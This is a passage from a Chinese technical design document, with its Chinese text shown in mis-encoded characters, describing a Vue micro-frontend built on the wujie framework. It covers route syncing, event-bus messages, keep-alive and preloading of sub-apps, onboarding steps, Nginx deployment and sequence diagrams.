<table><thead><tr><th>ç»´åº¦</th><th>sync æ¨¡å¼ï¼ˆå½“å‰æ–¹æ¡ˆï¼‰</th><th>æ‰‹åŠ¨ bus åŒå‘é€šä¿¡ï¼ˆæ—§æ–¹æ¡ˆï¼‰</th></tr></thead><tbody><tr><td>è·¯ç”±åŒæ­¥</td><td>æ¡†æ¶è‡ªåŠ¨å¤„ç†</td><td>æ‰‹åŠ¨ <code>bus.$emit</code> + <code>bus.$on</code></td></tr><tr><td>é˜²å¾ªç¯</td><td>æ¡†æ¶å†…éƒ¨å¤„ç†ï¼Œæ— é£é™©</td><td><code>_fromMainApp</code> æ ‡è®°ï¼Œå­˜åœ¨ç«æ€é£é™©</td></tr><tr><td>ä»£ç é‡</td><td>é›¶é¢å¤–ä»£ç </td><td><code>setupRouterSync</code> + <code>updateQuery</code> + <code>afterEach</code></td></tr><tr><td>å­åº”ç”¨æ”¹é€ </td><td>æ— éœ€ä»»ä½•è·¯ç”±åŒæ­¥ä»£ç </td><td>æ¯ä¸ªå­åº”ç”¨éœ€å®ç° <code>setupRouterSync</code></td></tr><tr><td>å¯ç»´æŠ¤æ€§</td><td>é«˜ï¼ˆä¾èµ–æ¡†æ¶æ ‡å‡†èƒ½åŠ›ï¼‰</td><td>ä½ï¼ˆè‡ªå®šä¹‰é€»è¾‘ï¼Œæ’æŸ¥å›°éš¾ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-13">3.4 è·¯å¾„è§„èŒƒåŒ–</h3>
<p><code>menuClick</code> ä¸­å¯¹è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–ï¼Œå…¼å®¹ä¸åŒæ¥æºçš„è·¯å¾„æ ¼å¼ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// tabs.ts â†’ menuClick</span>
<span class="hljs-keyword">const</span> prefix = <span class="hljs-string">`/<span class="hljs-subst">${tab.appName}</span>`</span>;
<span class="hljs-keyword">let</span> fullPath = tab.<span class="hljs-property">path</span> || prefix;
<span class="hljs-comment">// TO_ROUTE ä¼ æ¥çš„å¯èƒ½æ˜¯å­åº”ç”¨å†…éƒ¨è·¯å¾„ï¼ˆå¦‚ /operation/xxxï¼‰ï¼Œéœ€è¦è¡¥å‰ç¼€</span>
<span class="hljs-keyword">if</span> (!fullPath.<span class="hljs-title function_">startsWith</span>(prefix)) {
  fullPath = <span class="hljs-string">`<span class="hljs-subst">${prefix}</span><span class="hljs-subst">${fullPath.startsWith(<span class="hljs-string">"/"</span>) ? <span class="hljs-string">""</span> : <span class="hljs-string">"/"</span>}</span><span class="hljs-subst">${fullPath}</span>`</span>;
}
<span class="hljs-comment">// wujie sync æ¨¡å¼ä¼šè‡ªåŠ¨åŒæ­¥å­åº”ç”¨è·¯ç”±ï¼Œåªéœ€ push å³å¯</span>
router.<span class="hljs-title function_">push</span>(fullPath);
</code></pre>
<hr/>
<h2 data-id="heading-14">å››ã€é€šä¿¡äº‹ä»¶åè®®</h2>
<h3 data-id="heading-15">4.1 äº‹ä»¶æ€»çº¿</h3>
<p>ä½¿ç”¨ wujie å†…ç½®çš„ <code>bus</code>ï¼ˆåŸºäº EventEmitterï¼‰ï¼Œæ‰€æœ‰å­åº”ç”¨å…±äº«åŒä¸€ä¸ª bus å®ä¾‹ã€‚</p>
<h3 data-id="heading-16">4.2 äº‹ä»¶æ¸…å•</h3>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šè·¯ç”±åŒæ­¥å·²ç”± wujie sync æ¨¡å¼è‡ªåŠ¨å¤„ç†ï¼Œbus äº‹ä»¶ä»…ç”¨äº<strong>ä¸šåŠ¡é€šä¿¡</strong>ã€‚</p>
</blockquote>
<h4 data-id="heading-17">å­åº”ç”¨ â†’ ä¸»åº”ç”¨</h4>





























<table><thead><tr><th>äº‹ä»¶å</th><th>è§¦å‘æ—¶æœº</th><th>æ•°æ®ç»“æ„</th><th>å¤„ç†æ–¹</th></tr></thead><tbody><tr><td><code>TO_ROUTE</code></td><td>å­åº”ç”¨è¯·æ±‚è·¨åº”ç”¨è·³è½¬</td><td><code>{ appName, path, query, name }</code></td><td><code>AuthenticatedLayout</code> â†’ <code>menuClick</code></td></tr><tr><td><code>ASSETS_404</code></td><td>å­åº”ç”¨é™æ€èµ„æºåŠ è½½å¤±è´¥</td><td><code>{ appName }</code></td><td><code>AuthenticatedLayout</code> â†’ å¼¹çª—æç¤ºåˆ·æ–°</td></tr><tr><td><code>CLOSE_ALL_TABS</code></td><td>å­åº”ç”¨è¯·æ±‚å…³é—­æ‰€æœ‰ Tab</td><td><code>{ appName }</code></td><td><code>AuthenticatedLayout</code> â†’ <code>removeTab</code></td></tr></tbody></table>
<h4 data-id="heading-18">ä¸»åº”ç”¨ â†’ å­åº”ç”¨</h4>























<table><thead><tr><th>äº‹ä»¶å</th><th>è§¦å‘æ—¶æœº</th><th>æ•°æ®ç»“æ„</th><th>å¤„ç†æ–¹</th></tr></thead><tbody><tr><td><code>CLOSE_ALL_TAB_TO_CHILD</code></td><td>å…³é—­å­åº”ç”¨ Tab</td><td><code>{ appName }</code></td><td>å­åº”ç”¨ç›‘å¬ â†’ é‡ç½®çŠ¶æ€</td></tr><tr><td><code>REFRESH_CHILD</code></td><td>åˆ·æ–°å­åº”ç”¨</td><td><code>{ appName }</code></td><td>å­åº”ç”¨ç›‘å¬ â†’ é‡æ–°åŠ è½½å½“å‰è·¯ç”±</td></tr></tbody></table>
<h4 data-id="heading-19">å·²åºŸå¼ƒäº‹ä»¶ï¼ˆç”± sync æ¨¡å¼æ›¿ä»£ï¼‰</h4>

















<table><thead><tr><th>äº‹ä»¶å</th><th>åºŸå¼ƒåŸå› </th></tr></thead><tbody><tr><td><del><code>ROUTE_CHANGE</code></del></td><td>å­â†’ä¸»è·¯ç”±åŒæ­¥å·²ç”± sync æ¨¡å¼è‡ªåŠ¨å¤„ç†</td></tr><tr><td><del><code>ROUTER_CHANGE_TO_CHILD</code></del></td><td>ä¸»â†’å­è·¯ç”±åŒæ­¥å·²ç”± sync æ¨¡å¼è‡ªåŠ¨å¤„ç†</td></tr></tbody></table>
<h3 data-id="heading-20">4.3 äº‹ä»¶ä½¿ç”¨åŸåˆ™</h3>
<ul>
<li><strong>è·¯ç”±åŒæ­¥</strong>ï¼šå®Œå…¨ä¾èµ– wujie sync æ¨¡å¼ï¼Œ<strong>ç¦æ­¢</strong>é€šè¿‡ bus æ‰‹åŠ¨åŒæ­¥è·¯ç”±</li>
<li><strong>ä¸šåŠ¡é€šä¿¡</strong>ï¼šè·¨åº”ç”¨è·³è½¬ï¼ˆ<code>TO_ROUTE</code>ï¼‰ã€èµ„æºå¼‚å¸¸ï¼ˆ<code>ASSETS_404</code>ï¼‰ç­‰ä¸šåŠ¡åœºæ™¯ä»ä½¿ç”¨ bus</li>
<li><strong>äº‹ä»¶è¿‡æ»¤</strong>ï¼šå­åº”ç”¨é€šè¿‡ <code>data.appName</code> è¿‡æ»¤éè‡ªèº«äº‹ä»¶</li>
</ul>
<hr/>
<h2 data-id="heading-21">äº”ã€å­åº”ç”¨ç®¡ç†ä¸ä¿æ´»æ–¹æ¡ˆ</h2>
<h3 data-id="heading-22">5.1 wujie alive æ¨¡å¼</h3>
<p>æ‰€æœ‰å­åº”ç”¨å‡ä½¿ç”¨ <strong>alive ä¿æ´»æ¨¡å¼</strong>ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- App.vue --&gt;
&lt;WujieVue
  v-for="app in loadedApps"
  :key="app.name"
  :alive="true"           â† ä¿æ´»æ¨¡å¼
  v-show="route.path.startsWith(app.activeRule)"
  :name="app.name"
  :url="getAppUrl(app)"
  :props="{ token, userInfo }"
/&gt;
</code></pre>
<p><strong>alive æ¨¡å¼ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>å­åº”ç”¨é¦–æ¬¡åŠ è½½åï¼Œ<strong>å®ä¾‹ä¸é”€æ¯</strong>ï¼Œåˆ‡æ¢æ—¶ä»…åš <code>display: none</code></li>
<li>å­åº”ç”¨çš„ Vue å®ä¾‹ã€Pinia Storeã€DOM çŠ¶æ€å…¨éƒ¨ä¿ç•™</li>
<li>åˆ‡æ¢å›æ¥æ—¶<strong>æ— éœ€é‡æ–°åˆå§‹åŒ–</strong>ï¼Œä½“éªŒæ¥è¿‘åŸç”Ÿ Tab åˆ‡æ¢</li>
<li>å­åº”ç”¨å†…éƒ¨çš„è¡¨å•å¡«å†™ã€æ»šåŠ¨ä½ç½®ã€å¼¹çª—çŠ¶æ€ç­‰å…¨éƒ¨ä¿ç•™</li>
</ul>
<h3 data-id="heading-23">5.2 æŒ‰éœ€æ¸²æŸ“ç­–ç•¥</h3>
<p>ä¸ºé¿å…æœªå¯åŠ¨çš„å­åº”ç”¨è§¦å‘åŠ è½½é”™è¯¯ï¼Œé‡‡ç”¨<strong>æŒ‰éœ€æ¸²æŸ“</strong>ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// App.vue</span>
<span class="hljs-keyword">const</span> visitedApps = <span class="hljs-title function_">reactive</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;())

<span class="hljs-comment">// ä»…æ¸²æŸ“ç”¨æˆ·å·²è®¿é—®è¿‡çš„å­åº”ç”¨</span>
<span class="hljs-keyword">const</span> loadedApps = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span>
  microAppRegistry.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> visitedApps.<span class="hljs-title function_">has</span>(app.<span class="hljs-property">name</span>))
)

<span class="hljs-comment">// ç›‘å¬è·¯ç”±å˜åŒ–ï¼Œæ ‡è®°å·²è®¿é—®</span>
<span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> route.<span class="hljs-property">path</span>, <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> matched = <span class="hljs-title function_">findAppByRoute</span>(path)
  <span class="hljs-keyword">if</span> (matched) {
    visitedApps.<span class="hljs-title function_">add</span>(matched.<span class="hljs-property">name</span>)
  }
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> })
</code></pre>
<p><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">ç”¨æˆ·é¦–æ¬¡è®¿é—® /ibs-manage/xxx
  â†’ visitedApps.add('ibs-manage')
  â†’ loadedApps åŒ…å« ibs-manage
  â†’ WujieVue ç»„ä»¶æ¸²æŸ“ â†’ åŠ è½½å­åº”ç”¨ â†’ æŒ‚è½½
  â†’ <span class="hljs-attr">v-show</span>=<span class="hljs-literal">true</span>ï¼ˆå½“å‰æ¿€æ´»ï¼‰

ç”¨æˆ·åˆ‡æ¢åˆ° /doc/xxx
  â†’ visitedApps.add('doc')
  â†’ ibs-manage: <span class="hljs-attr">v-show</span>=<span class="hljs-literal">false</span>ï¼ˆéšè—ä½†ä¿æ´»ï¼‰
  â†’ doc: WujieVue æ¸²æŸ“ â†’ åŠ è½½ â†’ <span class="hljs-attr">v-show</span>=<span class="hljs-literal">true</span>

ç”¨æˆ·åˆ‡å› /ibs-manage/yyy
  â†’ ibs-manage: <span class="hljs-attr">v-show</span>=<span class="hljs-literal">true</span>ï¼ˆç¬é—´æ¢å¤ï¼Œæ— éœ€é‡æ–°åŠ è½½ï¼‰
  â†’ doc: <span class="hljs-attr">v-show</span>=<span class="hljs-literal">false</span>ï¼ˆéšè—ä½†ä¿æ´»ï¼‰
</code></pre>
<h3 data-id="heading-24">5.3 é¢„åŠ è½½ç­–ç•¥</h3>
<p>åœ¨ <code>AuthenticatedLayout</code> çš„ <code>onMounted</code> ä¸­è§¦å‘é¢„åŠ è½½ï¼Œåˆ†ä¼˜å…ˆçº§ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// plugins/wujie.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">preloadChildApps</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> highPriority = [<span class="hljs-string">'doc'</span>, <span class="hljs-string">'mkt'</span>]  <span class="hljs-comment">// é«˜é¢‘å­åº”ç”¨</span>

  <span class="hljs-comment">// é«˜ä¼˜å…ˆçº§ï¼šç«‹å³é¢„åŠ è½½</span>
  highPriorityApps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> {
    <span class="hljs-title function_">preloadApp</span>({ <span class="hljs-attr">name</span>: app.<span class="hljs-property">name</span>, <span class="hljs-attr">url</span>: <span class="hljs-title function_">getAppUrl</span>(app) })
  })

  <span class="hljs-comment">// ä½ä¼˜å…ˆçº§ï¼šå»¶è¿Ÿ 3 ç§’åé¢„åŠ è½½</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    lowPriorityApps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> {
      <span class="hljs-title function_">preloadApp</span>({ <span class="hljs-attr">name</span>: app.<span class="hljs-property">name</span>, <span class="hljs-attr">url</span>: <span class="hljs-title function_">getAppUrl</span>(app) })
    })
  }, <span class="hljs-number">3000</span>)
}
</code></pre>
<p><strong>é¢„åŠ è½½ vs æŒ‰éœ€æ¸²æŸ“çš„åŒºåˆ«</strong>ï¼š</p>






























<table><thead><tr><th>ç»´åº¦</th><th>é¢„åŠ è½½ (preloadApp)</th><th>æŒ‰éœ€æ¸²æŸ“ (WujieVue)</th></tr></thead><tbody><tr><td>æ—¶æœº</td><td>ç™»å½•æˆåŠŸåç«‹å³</td><td>ç”¨æˆ·é¦–æ¬¡è®¿é—®æ—¶</td></tr><tr><td>ä½œç”¨</td><td>æå‰ä¸‹è½½å­åº”ç”¨é™æ€èµ„æº</td><td>åˆ›å»ºå­åº”ç”¨å®ä¾‹å¹¶æŒ‚è½½</td></tr><tr><td>èµ„æº</td><td>ä»…ç½‘ç»œè¯·æ±‚</td><td>ç½‘ç»œ + DOM + JS æ‰§è¡Œ</td></tr><tr><td>ç›®çš„</td><td>å‡å°‘é¦–æ¬¡æ‰“å¼€å»¶è¿Ÿ</td><td>å®é™…æ¸²æŸ“å­åº”ç”¨</td></tr></tbody></table>
<h3 data-id="heading-25">5.4 å­åº”ç”¨å®¹å™¨å¸ƒå±€</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// App.vue</span>
<span class="hljs-selector-class">.child-app-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vh</span> - <span class="hljs-number">66px</span>);  <span class="hljs-comment">// å‡å» Header é«˜åº¦</span>
  <span class="hljs-attribute">overflow</span>: hidden;
}

<span class="hljs-comment">// AuthenticatedLayout.vue</span>
<span class="hljs-selector-class">.authenticated-layout</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
}
<span class="hljs-selector-class">.custom-tabs-content</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vh</span> - <span class="hljs-number">66px</span>);
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">position</span>: relative;
}
</code></pre>
<h3 data-id="heading-26">5.5 å­åº”ç”¨ Props ä¼ é€’</h3>
<p>ä¸»åº”ç”¨é€šè¿‡ WujieVue çš„ <code>:props</code> å‘å­åº”ç”¨ä¼ é€’å…±äº«æ•°æ®ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;WujieVue
  :props="{ token: userStore.token, userInfo: userStore.userInfo }"
/&gt;
</code></pre>
<p>å­åº”ç”¨é€šè¿‡ <code>window.__WUJIE.props</code> è¯»å–ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å­åº”ç”¨ wujie-bridge.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getWujieProps</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">__WUJIE</span>?.<span class="hljs-property">props</span> || {}
}
</code></pre>
<hr/>
<h2 data-id="heading-27">å…­ã€å­åº”ç”¨æ¥å…¥è§„èŒƒ</h2>
<h3 data-id="heading-28">6.1 å­åº”ç”¨æ”¹é€ æ¸…å•</h3>
<p>æ¯ä¸ªå­åº”ç”¨éœ€è¦å®Œæˆä»¥ä¸‹æ”¹é€ æ‰èƒ½æ¥å…¥å¾®å‰ç«¯ï¼š</p>



































<table><thead><tr><th>æ­¥éª¤</th><th>æ–‡ä»¶</th><th>æ”¹åŠ¨å†…å®¹</th></tr></thead><tbody><tr><td>1</td><td><code>vite.config.ts</code></td><td>é…ç½® <code>base: VITE_BASE_PATH</code>ï¼Œ<code>server.headers</code> æ·»åŠ  CORS</td></tr><tr><td>2</td><td><code>.env.dev</code></td><td>è®¾ç½® <code>VITE_DEV_PORT</code>ã€<code>VITE_BASE_PATH</code>ã€<code>VITE_APP_NAME</code></td></tr><tr><td>3</td><td><code>src/utils/wujie-bridge.ts</code></td><td>æ–°å»ºé€šä¿¡æ¡¥æ¥å™¨ï¼ˆç¯å¢ƒæ£€æµ‹ã€bus é€šä¿¡ã€èµ„æº 404 æ£€æµ‹ï¼‰</td></tr><tr><td>4</td><td><code>src/main.ts</code></td><td>è°ƒç”¨ <code>errorCheck()</code></td></tr><tr><td>5</td><td><code>src/App.vue</code></td><td>ç§»é™¤æ—§çš„ iframe postMessage ç›‘å¬</td></tr></tbody></table>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šè·¯ç”±åŒæ­¥ç”± wujie sync æ¨¡å¼è‡ªåŠ¨å¤„ç†ï¼Œå­åº”ç”¨<strong>æ— éœ€</strong>ç¼–å†™ä»»ä½•è·¯ç”±åŒæ­¥ä»£ç ã€‚</p>
</blockquote>
<h3 data-id="heading-29">6.2 å­åº”ç”¨ wujie-bridge.ts æ ‡å‡†æ¨¡æ¿</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ¸å¿ƒå¯¼å‡º</span>
<span class="hljs-keyword">export</span> { isInWujie, isInIframe }       <span class="hljs-comment">// ç¯å¢ƒæ£€æµ‹</span>
<span class="hljs-keyword">export</span> { notifyMainApp }               <span class="hljs-comment">// å‘ä¸»åº”ç”¨å‘äº‹ä»¶</span>
<span class="hljs-keyword">export</span> { onMainAppEvent, offMainAppEvent } <span class="hljs-comment">// ç›‘å¬ä¸»åº”ç”¨äº‹ä»¶</span>
<span class="hljs-keyword">export</span> { errorCheck }                  <span class="hljs-comment">// èµ„æº 404 æ£€æµ‹</span>
<span class="hljs-keyword">export</span> { <span class="hljs-variable constant_">MESSAGE_TYPE</span> }                <span class="hljs-comment">// äº‹ä»¶ç±»å‹å¸¸é‡ï¼ˆTO_ROUTE, ASSETS_404, CLOSE_ALL_TABSï¼‰</span>
</code></pre>
<h3 data-id="heading-30">6.3 ä¸»åº”ç”¨æ³¨å†Œæ–°å­åº”ç”¨</h3>
<ol>
<li><strong>registry.ts</strong> æ·»åŠ å­åº”ç”¨é…ç½®ï¼ˆ<code>childPathList</code> è‡ªåŠ¨ä» registry æ´¾ç”Ÿï¼Œæ— éœ€æ‰‹åŠ¨ç»´æŠ¤ï¼‰</li>
<li><strong>router/index.ts</strong> æ·»åŠ å ä½è·¯ç”± <code>/{appName}/:pathMatch(.*)*</code></li>
<li><strong>.env.base</strong> æ·»åŠ  <code>VITE_{APP_NAME}_APP_URL</code></li>
<li><strong>tabs.ts appList</strong> æ·»åŠ  Tab é…ç½®</li>
</ol>
<hr/>
<h2 data-id="heading-31">ä¸ƒã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h2>
<h3 data-id="heading-32">7.1 Nginx é…ç½®è¦ç‚¹</h3>
<pre><code class="hljs language-nginx" lang="nginx"># ä¸»åº”ç”¨
location /micro-main/ {
  try_files $uri $uri/ /micro-main/index.html;
}

# å­åº”ç”¨ï¼ˆä»¥ ibs-manage ä¸ºä¾‹ï¼‰
location /ibs-manage/ {
  proxy_pass http://ibs-manage-server/;
  # æˆ–é™æ€æ–‡ä»¶
  # alias /path/to/ibs-manage/dist/;
  # try_files $uri $uri/ /ibs-manage/index.html;
}
</code></pre>
<h3 data-id="heading-33">7.2 URL ç”Ÿæˆç­–ç•¥</h3>
<pre><code class="hljs language-bash" lang="bash">å¼€å‘ç¯å¢ƒ:
  ä¸»åº”ç”¨: http://localhost:3000/micro-main/
  å­åº”ç”¨: http://localhost:3007/ibs-manage/  (ç”±ç¯å¢ƒå˜é‡ VITE_IBS_MANAGE_APP_URL æä¾›)
  WujieVue url = http://localhost:3007/ibs-manage/

ç”Ÿäº§ç¯å¢ƒ:
  ä¸»åº”ç”¨: https://domain.com/micro-main/
  å­åº”ç”¨: https://domain.com/ibs-manage/  (ç”± nginx åå‘ä»£ç†)
  WujieVue url = /ibs-manage/  (ç›¸å¯¹è·¯å¾„)
</code></pre>
<hr/>
<h2 data-id="heading-34">å…«ã€å·²çŸ¥é™åˆ¶ä¸åç»­è§„åˆ’</h2>
<h3 data-id="heading-35">8.1 å½“å‰é™åˆ¶</h3>

























<table><thead><tr><th>é™åˆ¶</th><th>è¯´æ˜</th><th>å½±å“</th></tr></thead><tbody><tr><td>å­åº”ç”¨ä½¿ç”¨ WebHistory</td><td>å­åº”ç”¨ router ä½¿ç”¨ <code>createWebHistory(BASE_URL)</code>ï¼Œåœ¨ wujie æ²™ç®±ä¸­ location è¢«ä»£ç†</td><td>å­åº”ç”¨ç‹¬ç«‹è¿è¡Œå’Œå¾®å‰ç«¯è¿è¡Œè¡Œä¸ºä¸€è‡´</td></tr><tr><td>èœå•è·¯å¾„ä¾èµ–åç«¯ module å­—æ®µ</td><td><code>buildFullPath</code> æ ¹æ® <code>menu.module</code> æ‹¼æ¥ <code>/${appName}</code> å‰ç¼€</td><td>åç«¯èœå•é…ç½®éœ€æ­£ç¡®è®¾ç½® module</td></tr><tr><td>é¢„åŠ è½½ä¾èµ–å­åº”ç”¨ dev server</td><td>å¼€å‘ç¯å¢ƒä¸‹å­åº”ç”¨æœªå¯åŠ¨æ—¶é¢„åŠ è½½ä¼šé™é»˜å¤±è´¥</td><td>ä¸å½±å“åŠŸèƒ½ï¼Œä»…å½±å“é¦–æ¬¡åŠ è½½é€Ÿåº¦</td></tr></tbody></table>
<h3 data-id="heading-36">8.2 åç»­è§„åˆ’</h3>

























<table><thead><tr><th>é˜¶æ®µ</th><th>å†…å®¹</th><th>ä¼˜å…ˆçº§</th></tr></thead><tbody><tr><td>Phase 3.1</td><td>å‰©ä½™ 5 ä¸ªå­åº”ç”¨è¿ç§»åˆ° monorepo</td><td>é«˜</td></tr><tr><td>Phase 3.2</td><td>å­åº”ç”¨é—´ç›´æ¥é€šä¿¡ï¼ˆä¸ç»è¿‡ä¸»åº”ç”¨ä¸­è½¬ï¼‰</td><td>ä½</td></tr><tr><td>Phase 3.3</td><td>å­åº”ç”¨ç‹¬ç«‹éƒ¨ç½² + ç‰ˆæœ¬ç®¡ç†</td><td>ä½</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-37">é™„å½• Aï¼šå®Œæ•´æ•°æ®æµæ—¶åºå›¾</h2>
<h3 data-id="heading-38">A.1 èœå•ç‚¹å‡» â†’ å­åº”ç”¨æ¸²æŸ“ï¼ˆsync æ¨¡å¼ï¼‰</h3>
<pre><code class="hljs language-dart" lang="dart">ç”¨æˆ·          SiderMenu      tabs.ts       Vue Router     App.vue        wujie(<span class="hljs-keyword">sync</span>)    å­åº”ç”¨
 â”‚               â”‚              â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚â”€â”€ç‚¹å‡»èœå•â”€â”€â†’  â”‚              â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚               â”‚â”€â”€menuClickâ”€â”€â†’â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚               â”‚              â”‚â”€â”€pushâ”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚             â”‚              â”‚             â”‚
 â”‚               â”‚              â”‚              â”‚â”€â”€è·¯ç”±å˜åŒ–â”€â”€â”€â†’â”‚              â”‚             â”‚
 â”‚               â”‚              â”‚              â”‚             â”‚â”€â”€æ ‡è®°å·²è®¿é—®   â”‚             â”‚
 â”‚               â”‚              â”‚              â”‚             â”‚  (visitedApps)â”‚             â”‚
 â”‚               â”‚              â”‚              â”‚             â”‚â”€â”€v-<span class="hljs-keyword">show</span>=<span class="hljs-keyword">true</span>  â”‚             â”‚
 â”‚               â”‚              â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚               â”‚              â”‚              â”‚  URL å˜åŒ– â†’ wujie <span class="hljs-keyword">sync</span> è‡ªåŠ¨åŒæ­¥          â”‚
 â”‚               â”‚              â”‚              â”‚             â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚â”€â”€replaceâ”€â”€â”€â†’â”‚
 â”‚               â”‚              â”‚              â”‚             â”‚              â”‚             â”‚â”€â”€æ¸²æŸ“é¡µé¢
 â”‚               â”‚              â”‚              â”‚             â”‚              â”‚             â”‚
 âœ… æ— éœ€ bus é€šä¿¡ï¼Œæ— é˜²å¾ªç¯æ ‡è®°ï¼Œwujie æ¡†æ¶è‡ªåŠ¨å¤„ç†
</code></pre>
<h3 data-id="heading-39">A.2 å­åº”ç”¨å†…éƒ¨å¯¼èˆª â†’ ä¸»åº”ç”¨ URL åŒæ­¥ï¼ˆsync æ¨¡å¼ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">ç”¨æˆ·          å­åº”ç”¨         wujie(<span class="hljs-built_in">sync</span>)    Vue Router     App.vue
 â”‚              â”‚              â”‚              â”‚             â”‚
 â”‚â”€â”€ç‚¹å‡»é“¾æ¥â”€â”€â†’ â”‚              â”‚              â”‚             â”‚
 â”‚              â”‚â”€â”€pushâ”€â”€â”€â”€â”€â”€â”€â”€â”‚              â”‚             â”‚
 â”‚              â”‚              â”‚              â”‚             â”‚
 â”‚              â”‚  è·¯ç”±å˜åŒ– â†’ wujie <span class="hljs-built_in">sync</span> è‡ªåŠ¨åŒæ­¥åˆ°ä¸»åº”ç”¨ URL â”‚
 â”‚              â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚â”€â”€replaceâ”€â”€â”€â”€â†’â”‚             â”‚
 â”‚              â”‚              â”‚              â”‚â”€â”€è·¯ç”±å˜åŒ–â”€â”€â”€â†’â”‚
 â”‚              â”‚              â”‚              â”‚             â”‚â”€â”€ä»…æ ‡è®°å·²è®¿é—®
 â”‚              â”‚              â”‚              â”‚             â”‚
 âœ… æ— éœ€ bus é€šä¿¡ï¼Œåœ°å€æ è‡ªåŠ¨æ›´æ–°ä¸º /ibs-manage/operation/yyy
</code></pre>
<h3 data-id="heading-40">A.3 è·¨åº”ç”¨è·³è½¬ï¼ˆTO_ROUTE äº‹ä»¶ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">ç”¨æˆ·          å­åº”ç”¨A        wujie bus     AuthLayout     tabs.ts       Vue Router    wujie(<span class="hljs-built_in">sync</span>)   å­åº”ç”¨B
 â”‚              â”‚              â”‚             â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚â”€â”€æ“ä½œâ”€â”€â”€â”€â†’   â”‚              â”‚             â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚              â”‚â”€â”€emitâ”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚             â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚              â”‚  TO_ROUTE     â”‚â”€â”€æ”¶åˆ°â”€â”€â”€â”€â”€â”€â”€â†’â”‚              â”‚             â”‚              â”‚             â”‚
 â”‚              â”‚              â”‚             â”‚â”€â”€menuClickâ”€â”€â†’â”‚             â”‚              â”‚             â”‚
 â”‚              â”‚              â”‚             â”‚              â”‚â”€â”€pushâ”€â”€â”€â”€â”€â”€â”€â†’â”‚              â”‚             â”‚
 â”‚              â”‚              â”‚             â”‚              â”‚             â”‚  URL å˜åŒ– â†’ <span class="hljs-built_in">sync</span> è‡ªåŠ¨åŒæ­¥   â”‚
 â”‚              â”‚              â”‚             â”‚              â”‚             â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚â”€â”€replaceâ”€â”€â”€â†’â”‚
 â”‚              â”‚              â”‚             â”‚              â”‚             â”‚              â”‚             â”‚â”€â”€æ¸²æŸ“
